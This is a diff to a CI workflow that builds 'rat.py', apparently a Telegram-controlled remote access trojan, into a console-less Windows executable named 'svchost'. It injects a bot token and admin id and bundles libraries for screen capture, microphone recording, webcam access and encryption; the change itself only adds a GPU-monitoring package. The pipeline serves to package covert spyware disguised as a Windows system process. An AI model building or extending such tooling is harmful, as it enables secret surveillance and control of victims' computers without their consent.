@@ -28,7 +28,7 @@ jobs:
       - name: Install dependencies
         run: |
           pip install pyinstaller
-          pip install python-telegram-bot pillow psutil requests sounddevice soundfile cryptography opencv-python numpy pycaw comtypes
+          pip install python-telegram-bot pillow psutil requests sounddevice soundfile cryptography opencv-python numpy pycaw comtypes gputil
       
       - name: Replace token and admin_id in rat.py
         run: |
@@ -44,7 +44,7 @@ jobs:
       
       - name: Build EXE (32-bit, без консоли)
         run: |
-          pyinstaller --onefile --windowed --name "svchost" --target-arch x86 --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --collect-all telegram rat.py
+          pyinstaller --onefile --windowed --name "svchost" --target-arch x86 --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --hidden-import GPUtil --collect-all telegram rat.py
       
       - name: Upload EXE
         uses: actions/upload-artifact@v4
